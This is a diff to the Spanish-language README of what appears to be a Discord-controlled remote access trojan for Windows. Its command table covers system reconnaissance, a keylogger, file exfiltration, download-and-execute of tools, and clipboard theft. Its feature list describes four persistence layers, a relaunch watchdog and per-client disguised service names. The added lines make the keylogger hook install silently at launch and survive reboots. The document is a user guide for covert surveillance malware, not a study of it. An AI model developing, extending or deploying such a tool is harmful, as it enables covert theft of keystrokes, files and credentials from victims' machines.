@@ -52,9 +52,9 @@ Se ejecutan en el canal de sesión del equipo. El panel publica además quince b
 | `/sysinfo` | Hostname, usuario, IP, Windows, privilegios. | Primera foto del equipo. |
 | `/ps list` | Lista procesos con PID y memoria. | Ver qué corre encima. |
 | `/ps kill <pid>` | Mata el proceso y sus hijos. | Quitar lo que estorba. |
-| `/keylog start` | Arranca el keylogger. | Capturar lo escrito fuera del navegador. |
-| `/keylog stop` | Lo detiene. | Cerrar la captura. |
-| `/keylog dump` | Publica lo capturado. | Leer el log. |
+| `/keylog start` | Reengancha el keylogger si lo detuviste. | Captura activa sin reiniciar. |
+| `/keylog stop` | Lo detiene hasta el próximo arranque. | Cortar la captura en caliente. |
+| `/keylog dump` | Publica lo capturado desde el último dump. | Extraer el log, sin pasar por start. |
 | `/download <ruta>` | Sube un archivo o carpeta comprimida. | Sacar lo que interesa. |
 | `/upload <url>` | Descarga y opcionalmente ejecuta. | Meter una herramienta. |
 | `/clip get` | Lee el portapapeles. | Recuperar lo último copiado. |
@@ -77,6 +77,7 @@ Se ejecutan en el canal de sesión del equipo. El panel publica además quince b
 - **Cuatro capas de persistencia**: RunKey, tarea de logon, tarea de arranque como SYSTEM y servicio. Un watchdog revisa cada minuto y relanza si falta.
 - **Reconexión** con espera creciente, más watchdog de red para la sesión zombi.
 - **Identidad propia** por cliente: nombre, servicio, tareas, registro y carpeta salen de `internal/config` y se fijan al compilar con `-ldflags -X`.
+- **Keylogger activo desde el arranque**: el hook `WH_KEYBOARD_LL` se monta al abrir el binario, sin comando. Escribe en lote a `ProgramData`, sobrevive reinicios y `/keylog dump` entrega solo lo nuevo.
 - **Sin puertos abiertos**: todo sale hacia el gateway y el webhook.
 - **Una aplicación de Discord por cliente**: dos agentes con el mismo token se expulsan.
 
